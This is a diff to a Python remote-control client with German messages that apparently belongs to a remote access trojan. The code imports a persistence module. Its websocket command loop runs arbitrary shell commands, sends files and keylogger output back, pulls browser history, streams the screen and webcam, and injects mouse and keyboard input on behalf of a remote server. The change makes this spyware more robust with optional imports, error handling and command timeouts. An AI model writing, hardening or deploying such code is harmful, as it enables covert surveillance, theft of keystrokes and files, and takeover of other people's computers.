@@ -15,12 +15,29 @@ from datetime import datetime
 
 from modules.persistence import manage_persistence, uninstall_client
 
-import browserhistory as bh
-import mss
-import mss.tools
+try:
+    import browserhistory as bh
+except ImportError:
+    bh = None
+
+try:
+    import mss
+    import mss.tools
+except ImportError:
+    mss = None
+
 import psutil
-import pyautogui
-import pymsgbox  # For message box alerts
+
+try:
+    import pyautogui
+except ImportError:
+    pyautogui = None
+
+try:
+    import pymsgbox  # For message box alerts
+except ImportError:
+    pymsgbox = None
+
 import websockets
 from PIL import Image
 
@@ -53,10 +70,12 @@ def get_initial_info() -> dict:
     except Exception:
         user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
     
-    try:
-        screen_width, screen_height = pyautogui.size()
-    except Exception:
-        screen_width, screen_height = 0, 0
+    screen_width, screen_height = 0, 0
+    if pyautogui:
+        try:
+            screen_width, screen_height = pyautogui.size()
+        except Exception:
+            pass
         
     return {
         "type": "info",
@@ -129,6 +148,8 @@ def get_network_info() -> str:
 
 def get_history() -> str:
     """Ruft den Browserverlauf ab."""
+    if not bh:
+        return "Fehler: 'browserhistory' Modul nicht installiert."
     try:
         history = bh.get_browserhistory()
         output = ["Browserverlauf:"]
@@ -222,6 +243,8 @@ def kill_process(pid: str) -> str:
 
 def show_message_box(text: str) -> str:
     """Zeigt eine Nachrichtenbox an."""
+    if not pymsgbox:
+        return "Fehler: 'pymsgbox' Modul nicht installiert."
     try:
         pymsgbox.alert(text=text, title="Nachricht vom Server")
         return "Nachrichtenbox angezeigt."
@@ -473,20 +496,28 @@ def list_webcams() -> str:
 async def run_shell_command(command: str) -> str:
     """Führt einen Shell-Befehl aus und gibt die Ausgabe zurück."""
     try:
+        # Use shell based on OS
+        shell = os.environ.get("SHELL", "/bin/sh") if platform.system() != "Windows" else None
+
         proc = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
-            cwd=os.getcwd()
+            cwd=os.getcwd(),
+            executable=shell
         )
         
-        stdout, stderr = await proc.communicate()
-        
+        try:
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
+        except asyncio.TimeoutError:
+            proc.kill()
+            return "Fehler: Befehl hat das Zeitlimit von 60 Sekunden überschritten."
+
         output = ""
         if stdout:
-            output += stdout.decode(errors='ignore')
+            output += stdout.decode(errors='replace')
         if stderr:
-            output += stderr.decode(errors='ignore')
+            output += stderr.decode(errors='replace')
             
         return output if output else f"Befehl '{command}' ausgeführt (keine Ausgabe)."
         
@@ -509,24 +540,34 @@ async def process_commands(websocket: websockets.ClientConnection):
             if action == "exec":
                 output = await run_shell_command(command.get("command"))
             elif action == "screenshot":
-                with mss.mss() as sct:
-                    sct_img = sct.grab(sct.monitors[1])
-                    img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size) if sct_img else b""
-                    if not img_bytes:
-                        img_bytes = b""
-                response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
-            elif action == "download":
-                path = command.get("path")
-                if os.path.isfile(path):
-                    with open(path, "rb") as f:
-                        file_data = base64.b64encode(f.read()).decode("utf-8")
-                    response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
+                if mss:
+                    try:
+                        with mss.mss() as sct:
+                            sct_img = sct.grab(sct.monitors[1])
+                            img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size) if sct_img else b""
+                            response = {"type": "screenshot", "data": base64.b64encode(img_bytes).decode("utf-8")}
+                    except Exception as e:
+                        output = f"Screenshot Fehler: {e}"
                 else:
-                    output = "Fehler: Datei nicht gefunden."
+                    output = "Fehler: 'mss' Modul nicht installiert."
+            elif action == "download":
+                try:
+                    path = command.get("path")
+                    if os.path.isfile(path):
+                        with open(path, "rb") as f:
+                            file_data = base64.b64encode(f.read()).decode("utf-8")
+                        response = {"type": "file_download", "filename": os.path.basename(path), "data": file_data}
+                    else:
+                        output = "Fehler: Datei nicht gefunden."
+                except Exception as e:
+                    output = f"Download Fehler: {e}"
             elif action == "upload":
-                with open(command.get("filename"), "wb") as f:
-                    f.write(base64.b64decode(command.get("data")))
-                output = f"Datei gespeichert: {command.get('filename')}"
+                try:
+                    with open(command.get("filename"), "wb") as f:
+                        f.write(base64.b64decode(command.get("data")))
+                    output = f"Datei gespeichert: {command.get('filename')}"
+                except Exception as e:
+                    output = f"Upload Fehler: {e}"
             elif action == "ls":
                 output = list_directory(command.get("path", "."))
             elif action == "cd":
@@ -564,15 +605,21 @@ async def process_commands(websocket: websockets.ClientConnection):
                 if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                     output = "Keylogger nicht verfügbar oder keine Daten."
                 else:
-                    with open(KEYLOG_FILE_PATH, "rb") as f:
-                        f.seek(0, os.SEEK_END)
-                        filesize = f.tell()
-                        count = command.get("count", 1000)
-                        f.seek(max(0, filesize - count))
-                        output = f.read().decode("utf-8", errors="ignore")
+                    try:
+                        with open(KEYLOG_FILE_PATH, "rb") as f:
+                            f.seek(0, os.SEEK_END)
+                            filesize = f.tell()
+                            count = command.get("count", 1000)
+                            f.seek(max(0, filesize - count))
+                            output = f.read().decode("utf-8", errors="replace")
+                    except Exception as e:
+                        output = f"Keylogger Fehler: {e}"
             elif action == "screenstream_start":
-                await screen_streamer.start(websocket)
-                output = "Screen-Streaming gestartet."
+                if mss:
+                    await screen_streamer.start(websocket)
+                    output = "Screen-Streaming gestartet."
+                else:
+                    output = "Fehler: 'mss' Modul nicht installiert."
             elif action == "screenstream_stop":
                 await screen_streamer.stop()
                 output = "Screen-Streaming gestoppt."
@@ -593,29 +640,41 @@ async def process_commands(websocket: websockets.ClientConnection):
                 await webcam_streamer.stop()
                 output = "Webcam-Streaming gestoppt."
             elif action == "mouse":
-                event_data = command.get("data", {})
-                event_type = event_data.get("type")
-                if event_type == "move":
-                    pyautogui.moveTo(event_data.get("x"), event_data.get("y"))
-                elif event_type == "click":
-                    x = event_data.get("x")
-                    y = event_data.get("y")
-                    if x is not None and y is not None:
-                        pyautogui.moveTo(x, y)
-                    pyautogui.click(
-                        button=event_data.get("button", "left"),
-                        clicks=event_data.get("clicks", 1)
-                    )
-                elif event_type == "scroll":
-                    pyautogui.scroll(event_data.get("delta_y", 0))
+                if pyautogui:
+                    try:
+                        event_data = command.get("data", {})
+                        event_type = event_data.get("type")
+                        if event_type == "move":
+                            pyautogui.moveTo(event_data.get("x"), event_data.get("y"))
+                        elif event_type == "click":
+                            x = event_data.get("x")
+                            y = event_data.get("y")
+                            if x is not None and y is not None:
+                                pyautogui.moveTo(x, y)
+                            pyautogui.click(
+                                button=event_data.get("button", "left"),
+                                clicks=event_data.get("clicks", 1)
+                            )
+                        elif event_type == "scroll":
+                            pyautogui.scroll(event_data.get("delta_y", 0))
+                    except Exception as e:
+                        output = f"Maus-Event Fehler: {e}"
+                else:
+                    output = "Fehler: 'pyautogui' Modul nicht installiert."
             elif action == "keyboard":
-                event_data = command.get("data", {})
-                key = event_data.get("key")
-                if key:
-                    if event_data.get("down", True):
-                        pyautogui.keyDown(key)
-                    else:
-                        pyautogui.keyUp(key)
+                if pyautogui:
+                    try:
+                        event_data = command.get("data", {})
+                        key = event_data.get("key")
+                        if key:
+                            if event_data.get("down", True):
+                                pyautogui.keyDown(key)
+                            else:
+                                pyautogui.keyUp(key)
+                    except Exception as e:
+                        output = f"Keyboard-Event Fehler: {e}"
+                else:
+                    output = "Fehler: 'pyautogui' Modul nicht installiert."
             else:
                 output = f"Unbekannte Aktion: {action}"
 
